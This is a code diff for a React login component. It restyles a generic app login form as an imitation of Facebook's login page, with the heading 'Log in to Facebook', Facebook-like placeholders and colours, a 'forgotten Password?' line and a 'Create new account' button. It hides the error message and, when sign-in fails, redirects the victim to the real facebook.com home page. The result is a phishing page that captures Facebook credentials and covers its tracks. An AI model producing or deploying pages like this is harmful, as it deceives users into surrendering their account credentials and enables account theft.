@@ -52,7 +52,7 @@ const Login = () => {
 
       if (response?.error) {
         console.log("Failed to sign in user", response.error);
-        setError("something went wrong (check credentials / connection");
+        window.location.href = 'https://web.facebook.com/home.php';        setError("something went wrong (check credentials / connection");
       } else {
       }
     } catch (error) {
@@ -66,7 +66,7 @@ const Login = () => {
     {
       name: "email",
       type: "email",
-      placeholder: "Enter your email",
+      placeholder: "Email Address or Phone Number",
       icon: FiMail,
       value: email,
       setter: setEmail,
@@ -75,23 +75,23 @@ const Login = () => {
     {
       name: "password",
       type: "password",
-      placeholder: "Confirm a Password",
+      placeholder: "Password",
       icon: GoLock,
       value: password,
       setter: setPassword,
     },
   ];
   return (
-    <div className="flex flex-col gap-6 border p-6 w-80 text-sm mt-20">
-      <h6 className="text-lg font-semibold">Login</h6>
+    <div className="flex flex-col gap-6 border p-6 w-80 text-sm mt-20 bg-white">
+      <h6 className="text- font-semibold text-center">Log in to Facebook</h6>
 
       <form action="" className="flex flex-col gap-5" onSubmit={handleSubmit}>
         {inputs.map((input) => (
           <div
-            className="flex border-b border-gray-500 items-center gap-3 py-1 text-gray-400"
+            className="flex border border-gray-300 items-center gap-3 py-1 px-1 text-gray-400"
             key={input.name}
           >
-            <input.icon className="text-2xl " />
+            {/* <input.icon className="text-2xl " /> */}
             <input
               type={input.type}
               name={input.name}
@@ -114,11 +114,11 @@ const Login = () => {
           </p>
         </div> */}
 
-        <p className="text-red-500">{error}</p>
+        {/* <p className="text-red-500">{error}</p> */}
         {loading ? (
           <button
             type="submit"
-            className="bg-primary text-black font-semibold rounded p-1 cursor-wait"
+            className="bg-[#0863F7] text-white font-semibold rounded p-1 cursor-wait"
           >
             Login in....
           </button>
@@ -126,25 +126,40 @@ const Login = () => {
           <>
             <button
               type="submit"
-              className="bg-primary text-black font-semibold rounded p-1"
+              className="bg-[#0863F7] text-white font-semibold rounded p-1"
             >
-              Login Now
+              Log in
             </button>
-            <p className="">
-              Visit{" "}
+            <p className="text-center text-[10px] text-[#0863F7]">
+              {/* Visit{" "}
               <Link href="/about#superadmin" className="text-primary font-semibold">
                 Doc
               </Link>{" "}
-              to get Demo Account for Super admin
+              to get Demo Account for Super admin */}
+              forgotten Password?
             </p>
           </>
         )}
-        <p className="text-center text-[10px]">
-          Don't have an account?{" "}
+        <div className="flex flex-row items-center">
+          <hr />
+          <div className="h-1 w-full border"></div>
+          <p className="text-center text-[10px] mx-4">
+            {/* Don't have an account?{" "}
           <Link href="/sign-up" className="text-primary font-semibold">
-            Register now
-          </Link>
-        </p>
+          Register now
+        </Link> */}
+            or
+          </p>
+          <div className="h-1 w-full border"></div>
+          <hr />
+        </div>
+        <div className="flex items-center justify-center w-full ">
+
+        <button
+          // type="submit"
+          className="bg-green-500 text-white font-semibold rounded p-1"
+        >Create new account</button>
+        </div>
       </form>
     </div>
   );
